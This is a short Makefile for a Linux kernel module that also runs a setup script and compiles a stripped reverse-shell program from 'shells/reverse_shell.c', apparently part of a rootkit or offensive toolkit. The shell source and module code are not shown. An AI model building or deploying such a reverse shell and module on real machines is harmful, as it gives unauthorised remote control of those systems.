# If KERNELRELEASE is defined, we've been invoked from the
# kernel build system and can use its language.
ifneq ($(KERNELRELEASE),)
        obj-m := myMod.o

# Otherwise we were called directly from the command
# line; invoke the kernel build system.
else
        KERNELDIR ?= /lib/modules/$(shell uname -r)/build
        PWD := $(shell pwd)
default:
	sh scripts/setup.sh
	gcc -Wall -m32 -s -o shells/reverse_shell shells/reverse_shell.c
	make -C $(KERNELDIR) M=$(PWD) modules

clean:
	rm Module.symvers modules.order myMod.mod.* myMod.ko* myMod.o myMod.c
endif